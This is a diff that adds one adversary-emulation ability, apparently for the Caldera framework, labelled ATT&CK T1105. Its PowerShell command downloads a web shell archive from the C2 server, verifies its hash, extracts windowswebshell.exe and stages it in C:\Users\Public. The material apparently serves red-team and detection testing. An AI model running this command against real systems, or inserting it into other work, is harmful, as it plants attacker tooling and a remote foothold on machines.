@@ -1,0 +1,29 @@
+- id: 03677b83-9e45-54e3-9d87-b10d6ba2c201
+  name: Stage official CTID Windows WebShell [MEP-WINDOWS-WEBSHELL-01]
+  description: Downloads the pinned official CTID archive, verifies SHA-256, and extracts a unique target executable.
+  tactic: command-and-control
+  technique:
+    attack_id: T1105
+    name: Ingress Tool Transfer
+  repeatable: false
+  platforms:
+    windows:
+      psh:
+        command: '$archive="C:\Users\Public\#{c2trace.target_name}.webshell.zip"; $dir="C:\Users\Public\#{c2trace.target_name}.webshell";
+
+          $wc=New-Object System.Net.WebClient; $wc.Headers.Add("file", "c2t_v4_windows_webshell_056bb041.zip"); $data=$wc.DownloadData("#{c2trace.caldera_http}/file/download");
+          [IO.File]::WriteAllBytes($archive,$data);
+
+          if ((Get-FileHash -LiteralPath $archive -Algorithm SHA256).Hash.ToLowerInvariant() -ne "056bb041b34d619e31c90639af508a2e6428fd42ccdad28e2d97f0360c333540")
+          { throw "CTID archive hash mismatch" };
+
+          Expand-Archive -LiteralPath $archive -DestinationPath $dir -Force; $src=Get-ChildItem -LiteralPath $dir -Recurse
+          -Filter windowswebshell.exe | Select-Object -First 1;
+
+          if ($null -eq $src) { throw "official webshell executable not found" }; Copy-Item -LiteralPath $src.FullName -Destination
+          "C:\Users\Public\#{c2trace.target_name}.exe" -Force;
+
+          '
+        payloads:
+        - c2t_v4_windows_webshell_056bb041.zip
+        delete_payload: false
